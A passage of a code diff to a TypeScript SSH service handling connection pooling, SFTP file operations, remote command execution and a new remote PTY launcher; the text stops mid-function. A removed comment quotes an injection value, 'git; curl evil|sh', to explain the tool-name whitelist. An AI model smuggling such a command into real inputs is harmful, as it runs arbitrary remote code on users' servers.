@@ -1,21 +1,10 @@
-/**
- * remote-ssh-service.ts — 远程 SSH 连接管理、环境探针、SFTP 文件系统与远程命令/终端服务。
- *
- * 职责：
- * 1. 维护远程 SSH 连接池（按 user@host:port 复用、并发单飞握手、断线自动重连、空闲超时回收）；
- * 2. 远程环境探针（Probe）：检测系统架构、基础依赖（git/node/bash/python）及包管理器；
- * 3. 远程目录浏览与文件操作（SFTP）：为右栏文件树、文件预览/编辑、上传及 AI 工具提供远程读写；
- * 4. 远程命令执行与虚拟 PTY 终端：通过已鉴权的 ssh2 连接直接开启交互式 Shell 与命令执行；
- * 5. SSH Profiles 本地安全持久化：凭据使用 AES-256-GCM 加密，支持按 URI 自动提取凭据重连；
- * 6. 远程工作区本地会话目录映射：对话 JSONL 保存在本地 `<dataDir>/remote-workspaces/<slug>`。
- */
-
 import { Client, type ClientChannel, type SFTPWrapper } from "ssh2";
 import { createCipheriv, createDecipheriv, createHash, randomBytes, randomUUID } from "node:crypto";
 import { existsSync, mkdirSync, readFileSync, writeFileSync, promises as fs } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { Readable } from "node:stream";
+import { StringDecoder } from "node:string_decoder";
 import { pathToFileURL } from "node:url";
 import { resolveDefaultPkgRoot } from "./plugin-updater.js";
 import { isAudioFile, previewKind } from "./text-sniff.js";
@@ -27,7 +16,7 @@ import type {
 	RemoteSshToolsInfo,
 } from "./protocol.js";
 
-const IDLE_TIMEOUT_MS = 30 * 60 * 1000; // 连接空闲 30 分钟自动断开
+const IDLE_TIMEOUT_MS = 30 * 60 * 1000;
 const PROBE_TIMEOUT_MS = 25_000;
 
 export interface ParsedRemoteUri {
@@ -43,11 +32,11 @@ interface ActiveConnection {
 	hostKey: string;
 	client: Client;
 	sftp?: SFTPWrapper;
-	// 并发首调的在途 SFTP 子系统通道 Promise（单飞，防止重复开通道泄漏）
 	sftpInflight?: Promise<SFTPWrapper>;
 	params: RemoteSshProbeParams;
 	system?: RemoteSshSystemInfo;
 	alive: boolean;
+	activeOperations: number;
 	timer: NodeJS.Timeout;
 }
 
@@ -72,7 +61,6 @@ interface StoredProfilesFile {
 
 const DEFAULT_KEY_CANDIDATES = ["~/.ssh/id_ed25519", "~/.ssh/id_ecdsa", "~/.ssh/id_rsa", "~/.ssh/id_dsa"];
 
-/** `~` 路径展开 */
 export function expandHome(p?: string): string | undefined {
 	if (p === undefined) return undefined;
 	const s = p.trim();
@@ -84,12 +72,10 @@ export function expandHome(p?: string): string | undefined {
 	return s;
 }
 
-/** 判断路径是否为 ssh:// 远程工作区 URI */
 export function isRemoteWorkspaceUri(uri?: string | null): boolean {
 	return Boolean(uri && uri.trim().startsWith("ssh://"));
 }
 
-/** 解析 ssh://user@host:port/remote/path */
 export function parseRemoteWorkspaceUri(uri: string): ParsedRemoteUri | null {
 	if (!isRemoteWorkspaceUri(uri)) return null;
 	const trimmed = uri.trim();
@@ -109,17 +95,12 @@ export function parseRemoteWorkspaceUri(uri: string): ParsedRemoteUri | null {
 	};
 }
 
-/** 构造规范的 ssh://user@host:port/remote/path */
 export function formatRemoteWorkspaceUri(username: string, host: string, port: number, remotePath: string): string {
 	const cleanPath = path.posix.normalize((remotePath || "/").replace(/\\/g, "/"));
 	const normPath = cleanPath.startsWith("/") ? cleanPath : `/${cleanPath}`;
 	return `ssh://${username}@${host}:${port || 22}${normPath !== "/" ? normPath.replace(/\/+$/, "") : "/"}`;
 }
 
-/**
- * 在远程工作区根 remoteRoot 下解析相对或绝对路径，防止 `..` 越界。
- * 返回 { abs: 远程 posix 绝对路径, rel: 相对工作区根的 posix 相对路径（根自身为 ""） }
- */
 export function resolveRemoteWorkspacePath(remoteRoot: string, rawPath: string): { abs: string; rel: string } | null {
 	const root = path.posix.normalize(remoteRoot.replace(/\\/g, "/")).replace(/\/+$/, "") || "/";
 	let cleaned = (rawPath || "").replace(/\\/g, "/").trim();
@@ -142,12 +123,6 @@ export function resolveRemoteWorkspacePath(remoteRoot: string, rawPath: string):
 
 const REMOTE_URI_MARKER_FILE = ".pi-remote-uri";
 
-/**
- * 将工作区路径（本地目录或 ssh:// URI）映射到本地会话物理存储目录。
- * - 本地工作区原样返回；
- * - 远程 ssh:// 工作区映射到 `<dataDir>/remote-workspaces/<slug>`，并在其中写入 `.pi-remote-uri` 标记文件，
- *   使得所有的会话 JSONL、计划、草稿全部 100% 存储在本地磁盘。
- */
 export function resolveWorkspaceSessionDir(dataDir: string | undefined, cwdOrUri: string): string {
 	const trimmed = (cwdOrUri || "").trim();
 	if (!isRemoteWorkspaceUri(trimmed)) {
@@ -169,16 +144,10 @@ export function resolveWorkspaceSessionDir(dataDir: string | undefined, cwdOrUri
 		if (!existsSync(markerPath)) {
 			writeFileSync(markerPath, trimmed, "utf8");
 		}
-	} catch {
-		// ignore mkdir error in read-only edge cases
-	}
+	} catch {}
 	return dir;
 }
 
-/**
- * 从本地会话物理存储目录还原出工作区标识：
- * 若目录下含有 `.pi-remote-uri` 标记文件，则返回原始 `ssh://...` URI；否则原样返回本地路径。
- */
 export function restoreWorkspaceUriFromSessionDir(dir: string): string {
 	if (!dir || isRemoteWorkspaceUri(dir)) return dir;
 	try {
@@ -187,20 +156,14 @@ export function restoreWorkspaceUriFromSessionDir(dir: string): string {
 			const uri = readFileSync(markerPath, "utf8").trim();
 			if (isRemoteWorkspaceUri(uri)) return uri;
 		}
-	} catch {
-		// ignore
-	}
+	} catch {}
 	return dir;
 }
 
-/** Shell 安全单引号转义 */
 export function shellQuotePosix(s: string): string {
 	return `'${String(s).replace(/'/g, `'\\''`)}'`;
 }
 
-/**
- * 将 SDK resolveToCwd 产生的本地路径（或原始输入路径）映射为远程工作区的 posix 绝对路径。
- */
 export function mapResolvedPathToRemote(
 	resolvedOrRawPath: string,
 	localSessionDir: string,
@@ -226,10 +189,6 @@ export function mapResolvedPathToRemote(
 	return stripped.startsWith("/") ? path.posix.normalize(stripped) : path.posix.resolve(remoteRoot, stripped);
 }
 
-/**
- * 生成面向 AI 的远程工作区身份与工具透明桥接提示词。
- * 在远程工作区下替代本地 WINDOWS_PERSONA 的平台身份描述，同时完整保留防挂死（timeout / 禁前台长驻 / TTY 禁交互 / GBK 编码）核心规则。
- */
 export function buildRemoteWorkspacePersona(remoteUri: string): string {
 	const parsed = parseRemoteWorkspaceUri(remoteUri);
 	const hostDesc = parsed ? `${parsed.username}@${parsed.host}:${parsed.port}` : remoteUri;
@@ -249,10 +208,6 @@ export function buildRemoteWorkspacePersona(remoteUri: string): string {
 	].join("\n");
 }
 
-/**
- * 将会话 cwd 格式化为系统提示词里的 Current working directory 展示文本。
- * 若为远程工作区，展示远程真实目录与 SSH URI，绝不向模型暴露本地缓存路径。
- */
 export function formatCwdForPrompt(cwdOrSessionDir: string): string {
 	const real = restoreWorkspaceUriFromSessionDir(cwdOrSessionDir);
 	if (isRemoteWorkspaceUri(real)) {
@@ -262,10 +217,6 @@ export function formatCwdForPrompt(cwdOrSessionDir: string): string {
 	return cwdOrSessionDir;
 }
 
-/**
- * 若当前会话目录对应远程 ssh:// 工作区，构造供 SDK 内置工具（read/write/edit/ls/find/grep）使用的远程 operations。
- * 若为普通本地工作区则返回 null。
- */
 export function createRemoteSdkOperations(localSessionDir: string) {
 	const remoteUri = restoreWorkspaceUriFromSessionDir(localSessionDir);
 	if (!isRemoteWorkspaceUri(remoteUri)) return null;
@@ -398,16 +349,15 @@ export function getGlobalRemoteSshService(): RemoteSshService | null {
 export class RemoteSshService {
 	private readonly dataDir: string;
 	private readonly connections = new Map<string, ActiveConnection>();
-	private readonly hostConnections = new Map<string, string>(); // hostKey -> connectionId
+	private readonly hostConnections = new Map<string, string>();
 	private readonly inflightConnects = new Map<string, Promise<ActiveConnection>>();
-	private readonly credentialCache = new Map<string, RemoteSshProbeParams>(); // hostKey -> hydrated params
+	private readonly credentialCache = new Map<string, RemoteSshProbeParams>();
 	private secretKey: Buffer | null = null;
 
 	constructor(dataDir: string) {
 		this.dataDir = dataDir;
 	}
 
-	/** 获取或初始化本地凭据加密密钥（32 字节 AES 密钥） */
 	private async getSecretKey(): Promise<Buffer> {
 		if (this.secretKey) return this.secretKey;
 		const keyPath = path.join(this.dataDir, ".remote-ssh.key");
@@ -477,7 +427,6 @@ export class RemoteSshService {
 				const content = await fs.readFile(this.legacyProfilesFilePath, "utf8");
 				const parsed = JSON.parse(content) as StoredProfilesFile;
 				if (parsed && parsed.version === 1 && typeof parsed.profiles === "object") {
-					// 迁移到新的 global-hosts.json
 					await fs.mkdir(this.dataDir, { recursive: true });
 					await fs.writeFile(this.profilesFilePath, JSON.stringify(parsed, null, 2), "utf8");
 					return parsed;
@@ -492,14 +441,12 @@ export class RemoteSshService {
 			await fs.mkdir(this.dataDir, { recursive: true });
 			const json = JSON.stringify(data, null, 2);
 			await fs.writeFile(this.profilesFilePath, json, "utf8");
-			// 同时保持旧文件同步（防止外部或旧调用方异常）
 			await fs.writeFile(this.legacyProfilesFilePath, json, "utf8").catch(() => {});
 		} catch (err) {
 			console.error("[remote-ssh] 无法保存 profiles 文件:", err);
 		}
 	}
 
-	/** 列出所有已保存的 SSH profiles */
 	async listProfiles(): Promise<RemoteSshProfileSummary[]> {
 		const data = await this.loadProfilesData();
 		return Object.values(data.profiles)
@@ -517,7 +464,6 @@ export class RemoteSshService {
 			.sort((a, b) => (b.lastConnected ?? 0) - (a.lastConnected ?? 0));
 	}
 
-	/** 获取解密后的 profile 凭据（仅供受信任的服务端内部模块使用） */
 	async getDecryptedProfile(name: string): Promise<{
 		profile: RemoteSshProfileSummary;
 		password?: string;
@@ -550,7 +496,6 @@ export class RemoteSshService {
 		};
 	}
 
-	/** 删除一个已保存的 profile */
 	async deleteProfile(name: string): Promise<void> {
 		const data = await this.loadProfilesData();
 		if (data.profiles[name]) {
@@ -559,7 +504,6 @@ export class RemoteSshService {
 		}
 	}
 
-	/** 记录或更新一个 profile */
 	async saveProfile(
 		name: string,
 		params: RemoteSshProbeParams,
@@ -598,10 +542,6 @@ export class RemoteSshService {
 		await this.saveProfilesData(data);
 	}
 
-	/**
-	 * 从内存缓存或磁盘已保存的 profile 中补全缺失的密码/私钥口令。
-	 * 例如用户在界面点击已保存的 profile 时前端未持有明文密码，此处自动解密填充。
-	 */
 	private async hydrateAuthParams(params: RemoteSshProbeParams): Promise<RemoteSshProbeParams> {
 		const port = params.port ?? 22;
 		const hostKey = `${params.username}@${params.host}:${port}`;
@@ -639,7 +579,6 @@ export class RemoteSshService {
 		return cloned;
 	}
 
-	/** 关闭某个连接 */
 	closeConnection(id: string): void {
 		const conn = this.connections.get(id);
 		if (conn) {
@@ -657,18 +596,29 @@ export class RemoteSshService {
 
 	private refreshConnectionTimer(conn: ActiveConnection): void {
 		clearTimeout(conn.timer);
+		if (!conn.alive || conn.activeOperations > 0) return;
 		conn.timer = setTimeout(() => {
 			this.closeConnection(conn.id);
 		}, IDLE_TIMEOUT_MS);
 		conn.timer.unref?.();
 	}
 
-	/** 建立底层 ssh2 Client 连接 */
+	private acquireConnection(conn: ActiveConnection): () => void {
+		conn.activeOperations = (conn.activeOperations ?? 0) + 1;
+		clearTimeout(conn.timer);
+		let released = false;
+		return () => {
+			if (released) return;
+			released = true;
+			conn.activeOperations--;
+			this.refreshConnectionTimer(conn);
+		};
+	}
+
 	private async createClient(
 		rawParams: RemoteSshProbeParams,
 	): Promise<{ client: Client; hydrated: RemoteSshProbeParams }> {
 		const params = await this.hydrateAuthParams(rawParams);
-		// plugin-sdk ships in both source and npm layouts; SFTP imports the same verifier.
 		const packageRoot = resolveDefaultPkgRoot();
 		if (!packageRoot) throw new Error("Cannot locate SSH host verification module");
 		const { createHostVerifier } = await import(
@@ -689,7 +639,6 @@ export class RemoteSshService {
 		const auth = params.auth;
 		if (auth.type === "password") {
 			connectConfig.password = auth.password;
-			// 同时支持 keyboard-interactive（许多 Linux OpenSSH 默认用 keyboard-interactive 验证密码）
 			connectConfig.tryKeyboard = true;
 			client.on("keyboard-interactive", (_name, _instructions, _instructionsLang, prompts, finish) => {
 				finish(prompts.map(() => auth.password ?? ""));
@@ -746,7 +695,6 @@ export class RemoteSshService {
 		});
 	}
 
-	/** 注册活跃连接并监听断开事件 */
 	private registerConnection(client: Client, hydrated: RemoteSshProbeParams): ActiveConnection {
 		const connId = randomUUID();
 		const hostKey = `${hydrated.username}@${hydrated.host}:${hydrated.port ?? 22}`;
@@ -756,6 +704,7 @@ export class RemoteSshService {
 			client,
 			params: hydrated,
 			alive: true,
+			activeOperations: 0,
 			timer: setTimeout(() => this.closeConnection(connId), IDLE_TIMEOUT_MS),
 		};
 		conn.timer.unref?.();
@@ -780,54 +729,66 @@ export class RemoteSshService {
 		return conn;
 	}
 
-	/** 执行远端 shell 命令并获取 stdout（默认 120s 超时——探针/安装脚本挂起时不至于永久 pending） */
 	private async execCommand(client: Client, cmd: string, timeoutMs = 120_000): Promise<string> {
-		return new Promise((resolve, reject) => {
-			let settled = false;
-			const timer =
-				timeoutMs > 0
-					? setTimeout(() => {
-							if (settled) return;
-							settled = true;
-							reject(new Error(`Remote command timed out after ${timeoutMs}ms`));
-						}, timeoutMs)
-					: null;
-			client.exec(cmd, (err, stream) => {
-				if (err) {
+		const conn = [...this.connections.values()].find((entry) => entry.client === client);
+		const release = conn ? this.acquireConnection(conn) : () => {};
+		try {
+			return await new Promise((resolve, reject) => {
+				let settled = false;
+				let channel: ClientChannel | undefined;
+				const onDisconnect = () => finish(new Error("SSH connection lost"));
+				const finish = (error?: Error, output = "") => {
 					if (settled) return;
 					settled = true;
 					if (timer) clearTimeout(timer);
-					return reject(err);
+					client.removeListener("close", onDisconnect);
+					client.removeListener("end", onDisconnect);
+					client.removeListener("error", onDisconnect);
+					if (error) reject(error);
+					else resolve(output);
+				};
+				client.once("close", onDisconnect);
+				client.once("end", onDisconnect);
+				client.once("error", onDisconnect);
+				const timer =
+					timeoutMs > 0
+						? setTimeout(() => {
+								finish(new Error(`Remote command timed out after ${timeoutMs}ms`));
+								try {
+									channel?.close();
+								} catch {}
+							}, timeoutMs)
+						: null;
+				try {
+					client.exec(cmd, (err, stream) => {
+						if (err) return finish(err);
+						channel = stream;
+						stream.on("error", (error: Error) => finish(error));
+						if (settled) {
+							try {
+								stream.close();
+							} catch {}
+							return;
+						}
+						let stdout = "";
+						let stderr = "";
+						stream.on("data", (chunk: Buffer) => {
+							stdout += chunk.toString("utf8");
+						});
+						stream.stderr.on("data", (chunk: Buffer) => {
+							stderr += chunk.toString("utf8");
+						});
+						stream.on("close", (code: number) => finish(undefined, code === 0 ? stdout : stdout || stderr));
+					});
+				} catch (error) {
+					finish(error as Error);
 				}
-				let stdout = "";
-				let stderr = "";
-				stream.on("data", (chunk: Buffer) => {
-					stdout += chunk.toString("utf8");
-				});
-				stream.stderr.on("data", (chunk: Buffer) => {
-					stderr += chunk.toString("utf8");
-				});
-				stream.on("close", (code: number) => {
-					if (settled) return;
-					settled = true;
-					if (timer) clearTimeout(timer);
-					if (code === 0) {
-						resolve(stdout);
-					} else {
-						resolve(stdout || stderr);
-					}
-				});
-				stream.on("error", (e: Error) => {
-					if (settled) return;
-					settled = true;
-					if (timer) clearTimeout(timer);
-					reject(e);
-				});
 			});
-		});
+		} finally {
+			release();
+		}
 	}
 
-	/** 远程环境深度探针（Probe） */
 	async probe(params: RemoteSshProbeParams): Promise<{
 		ok: boolean;
 		connectionId?: string;
@@ -863,7 +824,6 @@ export class RemoteSshService {
 			}
 		}
 
-		// 无论是否显式勾选，连接成功都持久化凭据以便打开远程工作区后能够跨请求/跨重启自动重连
 		if (params.saveProfile !== false) {
 			const pName = params.profileName?.trim() || `${hydrated.username}@${hydrated.host}`;
 			await this.saveProfile(pName, hydrated);
@@ -987,7 +947,6 @@ done
 		};
 	}
 
-	/** 取得指定连接并重置其空闲计时器 */
 	private getConnection(connectionId: string): ActiveConnection {
 		const conn = this.connections.get(connectionId);
 		if (!conn || !conn.alive) {
@@ -997,10 +956,6 @@ done
 		return conn;
 	}
 
-	/**
-	 * 按 host/port/username 获取存活连接；若已断开或服务刚重启，自动从缓存或 ssh-profiles.json
-	 * 提取加密保存的凭据重连（并发请求单飞合并）。
-	 */
 	async getOrConnectHost(host: string, port: number, username: string): Promise<ActiveConnection> {
 		const hostKey = `${username}@${host}:${port}`;
 		const existingId = this.hostConnections.get(hostKey);
@@ -1038,7 +993,6 @@ done
 						params = { host, port, username, auth: { type: "agent" } };
 					}
 				} else {
-					// 回退尝试默认 SSH 密钥
 					params = { host, port, username, auth: { type: "key" } };
 				}
 			}
@@ -1055,7 +1009,6 @@ done
 		}
 	}
 
-	/** 按远程工作区 URI 获取活跃连接与 SFTP 会话 */
 	async getOrConnectByUri(uri: string): Promise<{
 		conn: ActiveConnection;
 		sftp: SFTPWrapper;
@@ -1070,7 +1023,6 @@ done
 		return { conn, sftp, parsed };
 	}
 
-	/** 获取 SFTP 会话（单飞：并发首调共享同一条在途通道，不重复开） */
 	private async getSftp(conn: ActiveConnection): Promise<SFTPWrapper> {
 		if (conn.sftp) return conn.sftp;
 		if (!conn.sftpInflight) {
@@ -1095,7 +1047,6 @@ done
 		return conn.sftpInflight;
 	}
 
-	/** 浏览远程目录 */
 	async listDir(
 		connectionId: string,
 		reqPath?: string,
@@ -1206,7 +1157,6 @@ done
 		}
 	}
 
-	/** 在远端执行工具一键安装 */
 	async installTools(
 		connectionId: string,
 		tools: string[],
@@ -1218,9 +1168,6 @@ done
 		error?: string;
 	}> {
 		const requested = tools[0] || "git";
-		// 工具名直接拼进远端 root/sudo shell：白名单字符集 + shell 引用双保险，
-		// 否则 tools:["git; curl evil|sh"] 即在用户 SSH 服务器上执行任意命令。
-		// 放在 getConnection 之前：非法名字无需连接即可快速失败。
 		if (!/^[a-zA-Z][a-zA-Z0-9._+-]{0,63}$/.test(requested)) {
 			return { ok: false, connectionId, tool: requested, error: `非法的工具名：${requested}` };
 		}
@@ -1269,11 +1216,6 @@ fi
 		}
 	}
 
-	// =========================================================================
-	// 面向远程工作区 (ssh://...) 的文件、命令与终端操作 API
-	// =========================================================================
-
-	/** 在远程工作区执行 Shell 命令（支持流式输出回调、超时与 AbortSignal） */
 	async execInWorkspace(
 		uri: string,
 		command: string,
@@ -1290,17 +1232,20 @@ fi
 			let stderr = "";
 			let settled = false;
 			let timer: NodeJS.Timeout | undefined;
+			let release: (() => void) | undefined;
+			let detachConnection: (() => void) | undefined;
 			const signal = opts?.signal;
 			const finish = (exitCode: number, error?: unknown) => {
 				if (settled) return;
 				settled = true;
 				clearTimeout(timer);
+				release?.();
+				detachConnection?.();
 				signal?.removeEventListener("abort", onAbort);
 				if (error) reject(error);
 				else resolve({ stdout, stderr, exitCode });
 			};
 			const closeChannel = (channel: ClientChannel, killSignal: "TERM" | "KILL") => {
-				// Closing must still happen when the remote rejects the signal request.
 				try {
 					channel.signal(killSignal);
 				} catch {}
@@ -1309,25 +1254,35 @@ fi
 				} catch {}
 			};
 			const onAbort = () => {
-				// Settle before closing: close() may synchronously emit a successful exit.
 				finish(130, signal?.reason instanceof Error ? signal.reason : new Error("Command aborted"));
 				if (stream) closeChannel(stream, "TERM");
 			};
 			signal?.addEventListener("abort", onAbort, { once: true });
 			if (signal?.aborted) return onAbort();
 
-			// The connection is pooled/shared: abort this operation, not other users' connections.
 			void this.getOrConnectByUri(uri)
 				.then(({ conn, parsed }) => {
 					if (settled) return;
 					if (signal?.aborted) return onAbort();
+					release = this.acquireConnection(conn);
+					const onDisconnect = () => finish(1, new Error("SSH connection lost"));
+					conn.client.once?.("close", onDisconnect);
+					conn.client.once?.("end", onDisconnect);
+					conn.client.once?.("error", onDisconnect);
+					detachConnection = () => {
+						conn.client.removeListener?.("close", onDisconnect);
+						conn.client.removeListener?.("end", onDisconnect);
+						conn.client.removeListener?.("error", onDisconnect);
+					};
 					const targetDir = opts?.cwd || parsed.remotePath || "/";
 					const fullCmd = `cd ${shellQuotePosix(targetDir)} && ${command}`;
 					conn.client.exec(fullCmd, (err, channel) => {
 						if (err) return finish(1, err);
 						stream = channel;
-						// Keep an error handler even on a late channel, including during close().
-						channel.on("error", (error: Error) => finish(1, error));
+						channel.on("error", (error: Error) => {
+							finish(1, error);
+							closeChannel(channel, "TERM");
+						});
 						if (settled || signal?.aborted) {
 							if (!settled) onAbort();
 							else closeChannel(channel, "TERM");
@@ -1363,7 +1318,6 @@ fi
 		});
 	}
 
-	/** SFTP stat（跟随软链） */
 	async sftpStat(
 		uri: string,
 		remoteAbsPath: string,
@@ -1382,7 +1336,6 @@ fi
 		});
 	}
 
-	/** SFTP readdir（跟随符号链接判断目录） */
 	async sftpReaddir(
 		uri: string,
 		remoteAbsPath: string,
@@ -1422,7 +1375,6 @@ fi
 		return out;
 	}
 
-	/** SFTP 创建远程文件读取流（供 HTTP 下载与媒体流式预览使用） */
 	async sftpCreateReadStream(
 		uri: string,
 		remoteAbsPath: string,
@@ -1432,8 +1384,6 @@ fi
 		if (typeof sftp.createReadStream === "function") {
 			return sftp.createReadStream(remoteAbsPath, opts);
 		}
-		// 回退路径：整文件读进内存再切片。必须设上限——不支持 createReadStream 的
-		// 实现（基本只有测试 mock）遇到 GB 级文件会直接打爆内存（OOM）。
 		const MAX_FALLBACK_BYTES = 512 * 1024 * 1024;
 		const capEnd = opts?.end !== undefined ? Math.min(opts.end, MAX_FALLBACK_BYTES - 1) : MAX_FALLBACK_BYTES - 1;
 		const { data } = await this.sftpReadFile(uri, remoteAbsPath, MAX_FALLBACK_BYTES);
@@ -1446,7 +1396,6 @@ fi
 		return Readable.from(slice);
 	}
 
-	/** SFTP 读取远程文件 Buffer（可选限制最大读取字节数） */
 	async sftpReadFile(uri: string, remoteAbsPath: string, maxBytes?: number): Promise<{ data: Buffer; size: number }> {
 		const { sftp } = await this.getOrConnectByUri(uri);
 		const st = await this.sftpStat(uri, remoteAbsPath);
@@ -1471,7 +1420,6 @@ fi
 		});
 	}
 
-	/** SFTP 写入远程文件 */
 	async sftpWriteFile(
 		uri: string,
 		remoteAbsPath: string,
@@ -1502,8 +1450,6 @@ fi
 		const buf = typeof content === "string" ? Buffer.from(content, "utf8") : content;
 		return new Promise((resolve, reject) => {
 			const stream = sftp.createWriteStream(remoteAbsPath, opts?.flag ? { flags: opts.flag as any } : undefined);
-			// ssh2 disables Node's close emission and omits its own close on errors.
-			// Restore it so even failed _destroy callbacks signal resource release.
 			const state = (
 				stream as typeof stream & {
 					_writableState?: { emitClose: boolean; finalCalled?: boolean };
@@ -1524,10 +1470,6 @@ fi
 				stream.destroy();
 			};
 			const abort = () => stop(signal?.reason ?? new Error("SFTP write aborted"));
-			// ssh2's SFTP WriteStream calls `destroy()` from inside `_final`, so Writable never emits
-			// `finish` (proved by instrumenting the real stream: only `close` arrives, after the SFTP
-			// CLOSE acknowledgement). Completion is therefore decided by `close` _after_ `_final` ran:
-			// `_final` only runs once every WRITE has been acknowledged, so `finalCalled` means flushed.
 			const flushed = () => !!state?.finalCalled || stream.writableFinished;
 			const settle = (error?: unknown) => {
 				if (settled) return;
@@ -1538,10 +1480,7 @@ fi
 				else if (error) reject(error);
 				else resolve();
 			};
-			// Keep this listener after close as ssh2 may still report a late error.
 			stream.on("error", stop);
-			// Recorded only: `close` stays the completion signal, since a bare `finish` does not prove
-			// the SFTP CLOSE acknowledgement (durable flush) ever arrived.
 			stream.on("finish", () => {
 				finished = true;
 			});
@@ -1566,7 +1505,6 @@ fi
 		});
 	}
 
-	/** 递归创建远程目录 (mkdir -p) */
 	async sftpMkdirRecursive(uri: string, remoteAbsPath: string): Promise<void> {
 		const res = await this.execInWorkspace(uri, `mkdir -p ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
 		if (res.exitCode !== 0) {
@@ -1574,7 +1512,6 @@ fi
 		}
 	}
 
-	/** 重命名或移动远程文件/目录 */
 	async sftpRename(uri: string, oldRemoteAbs: string, newRemoteAbs: string): Promise<void> {
 		const { sftp } = await this.getOrConnectByUri(uri);
 		return new Promise((resolve, reject) => {
@@ -1585,20 +1522,16 @@ fi
 		});
 	}
 
-	/** 删除远程文件或目录 (rm -rf) */
 	async sftpRemove(uri: string, remoteAbsPath: string): Promise<void> {
 		if (!remoteAbsPath || remoteAbsPath === "/") {
 			throw new Error("Refusing to remove root directory");
 		}
-		// 与 sftpCopy 同口径：退出码非 0 必须抛错，否则权限不足/目录被占用时
-		// files-service 仍会向用户广播「已删除」
 		const res = await this.execInWorkspace(uri, `rm -rf ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
 		if (res.exitCode !== 0) {
 			throw new Error(res.stderr || res.stdout || `Remote remove failed for ${remoteAbsPath}`);
 		}
 	}
 
-	/** 复制或移动远程文件/目录 */
 	async sftpCopy(uri: string, srcRemoteAbs: string, destRemoteAbs: string, move?: boolean): Promise<void> {
 		const cmd = move
 			? `mv ${shellQuotePosix(srcRemoteAbs)} ${shellQuotePosix(destRemoteAbs)}`
@@ -1609,10 +1542,282 @@ fi
 		}
 	}
 
-	/**
-	 * 为内置终端（terminals.ts）创建基于 ssh2 Channel 的虚拟 IPty 实例。
-	 * 直接复用已鉴权（含密码/私钥）的 SSH 连接开启交互式 PTY Shell，100% 免二次输入密码。
-	 */
+	async createCommandPty(
+		uri: string,
+		command: { file: string; args: string[]; env?: NodeJS.ProcessEnv; unsetEnv?: string[] },
+		cols: number,
+		rows: number,
+		options: {
+			signal?: AbortSignal;
+			prepareBootstrap?: (script: string) => Promise<{ command: string; skipHandshake?: boolean }>;
+		} = {},
+	): Promise<import("node-pty").IPty> {
+		const validName = (key: string) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(key) && !key.startsWith("PI_WEB_BOOTSTRAP_");
+		if (!command.file || !command.file.startsWith("/") || /[\x00-\x1f\x7f]/.test(command.file))
+			throw new Error("Remote command requires an absolute POSIX executable path");
+		if (command.args.some((arg) => typeof arg !== "string" || arg.includes("\0")))
+			throw new Error("Invalid remote command arguments");
+		const assignments: string[] = [];
+		for (const key of command.unsetEnv ?? []) {
+			if (!validName(key)) throw new Error("Invalid remote environment name");
+			assignments.push(`unset ${key}`);
+		}
+		for (const [key, value] of Object.entries(command.env ?? {})) {
+			if (!validName(key) || (value !== undefined && /[\x00-\x08\x0b-\x1f\x7f]/.test(value)))
+				throw new Error("Invalid remote environment value");
+			if (value !== undefined) assignments.push(`export ${key}=${shellQuotePosix(value)}`);
+		}
+		let payload = assignments.join("\n") + "\n";
+		if (Buffer.byteLength(payload, "utf8") > 64 * 1024) throw new Error("Remote environment exceeds 64 KiB");
+		const nonce = randomBytes(24).toString("hex");
+		const ready = `__PI_WEB_READY_${nonce}__`;
+		const started = `__PI_WEB_STARTED_${nonce}__`;
+		const delimiter = `PI_WEB_END_${nonce}`;
+		if (payload.split("\n").includes(delimiter)) throw new Error("Invalid remote environment delimiter");
+		const signal = options.signal;
+		return new Promise((resolve, reject) => {
+			let stream: ClientChannel | undefined;
+			let release: (() => void) | undefined;
+			let detach: (() => void) | undefined;
+			let resolved = false;
+			let ended = false;
+			let phase: "ready" | "start" | "running" = "ready";
+			let markerBuffer = "";
+			let buffered = "";
+			let exit: { exitCode: number; signal?: number } | undefined;
+			let currentCols = Math.max(2, Math.floor(cols) || 80);
+			let currentRows = Math.max(2, Math.floor(rows) || 24);
+			const dataListeners = new Set<(data: string) => void>();
+			const exitListeners = new Set<(event: { exitCode: number; signal?: number }) => void>();
+			const decoder = new StringDecoder("utf8");
+			const close = () => {
+				try {
+					stream?.close();
+				} catch {}
+			};
+			const cleanup = () => {
+				clearTimeout(timer);
+				signal?.removeEventListener("abort", onAbort);
+				release?.();
+				detach?.();
+				payload = "";
+				markerBuffer = "";
+			};
+			const finish = (code: number, error?: Error) => {
+				if (ended) return;
+				ended = true;
+				cleanup();
+				exit = { exitCode: code };
+				if (!resolved) {
+					if (!error && phase === "running" && code === 0) {
+						resolved = true;
+						resolve(pty);
+					} else reject(error ?? new Error(`Remote CLI failed to start (exit ${code})`));
+				}
+				for (const listener of exitListeners) listener(exit);
+			};
+			const onAbort = () => {
+				finish(130, new Error("Remote CLI launch cancelled"));
+				close();
+			};
+			const timer = setTimeout(() => {
+				finish(124, new Error("Remote CLI launch timed out"));
+				close();
+			}, PROBE_TIMEOUT_MS);
+			const pty: import("node-pty").IPty = {
+				pid: Math.floor(10000 + Math.random() * 80000),
+				get cols() {
+					return currentCols;
+				},
+				get rows() {
+					return currentRows;
+				},
+				process: "ssh-remote-cli",
+				handleFlowControl: false,
+				onData(listener) {
+					dataListeners.add(listener);
+					if (buffered) {
+						const data = buffered;
+						buffered = "";
+						listener(data);
+					}
+					return {
+						dispose: () => {
+							dataListeners.delete(listener);
+						},
+					};
+				},
+				onExit(listener) {
+					exitListeners.add(listener);
+					if (exit) listener(exit);
+					return {
+						dispose: () => {
+							exitListeners.delete(listener);
+						},
+					};
+				},
+				write(data) {
+					if (!ended) stream?.write(data);
+				},
+				resize(newCols, newRows) {
+					currentCols = Math.max(2, Math.floor(newCols) || 80);
+					currentRows = Math.max(2, Math.floor(newRows) || 24);
+					if (!ended) {
+						try {
+							stream?.setWindow(currentRows, currentCols, 0, 0);
+						} catch {}
+					}
+				},
+				kill() {
+					finish(0, new Error("Remote CLI closed"));
+					close();
+				},
+				clear() {},
+				pause() {
+					stream?.pause();
+				},
+				resume() {
+					stream?.resume();
+				},
+			};
+			const emitData = (data: string) => {
+				if (!data) return;
+				if (!dataListeners.size) {
+					buffered += data;
+					if (buffered.length > 256 * 1024) {
+						finish(1, new Error("Remote CLI startup output exceeds limit"));
+						close();
+					}
+				} else for (const listener of dataListeners) listener(data);
+			};
+			const onData = (chunk: Buffer) => {
+				if (ended) return;
